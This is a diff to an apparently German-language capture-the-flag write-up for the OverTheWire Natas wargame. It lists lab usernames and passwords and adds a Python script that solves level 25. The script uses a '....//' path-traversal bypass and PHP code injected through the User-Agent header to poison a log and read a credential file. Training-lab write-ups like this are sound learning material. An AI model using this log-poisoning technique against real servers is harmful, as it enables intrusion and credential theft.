@@ -542,3 +542,27 @@ print(r.text)
 Zugriff:	[http://natas25.natas.labs.overthewire.org](http://natas25.natas.labs.overthewire.org)
 Username: `natas25`
 Passwort: `GHF6X7YwACaYYssHVY05cFq83hRktl4c`
+
+HTTP-Header PHP injection. 
+
+```Python
+import requests
+
+auth_user = "natas25"
+auth_password = "GHF6X7YwACaYYssHVY05cFq83hRktl4c"
+
+url = "http://natas25.natas.labs.overthewire.org/"
+data = {'lang':'....//logs/natas25_0u95n2ujbfuv8ip4tpbv24mjs5.log'}
+cookies = {'PHPSESSID':'0u95n2ujbfuv8ip4tpbv24mjs5'}
+headers = {'User-Agent': '<? echo file_get_contents("/etc/natas_webpass/natas26"); ?>'}
+r = requests.post(url=url, auth=(auth_user, auth_password), data=data, cookies=cookies, headers=headers)
+print(r.text)
+```
+
+
+
+# Natas 25
+
+Zugriff:	[http://natas26.natas.labs.overthewire.org](http://natas26.natas.labs.overthewire.org)
+Username: `natas26`
+Passwort: `oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T`
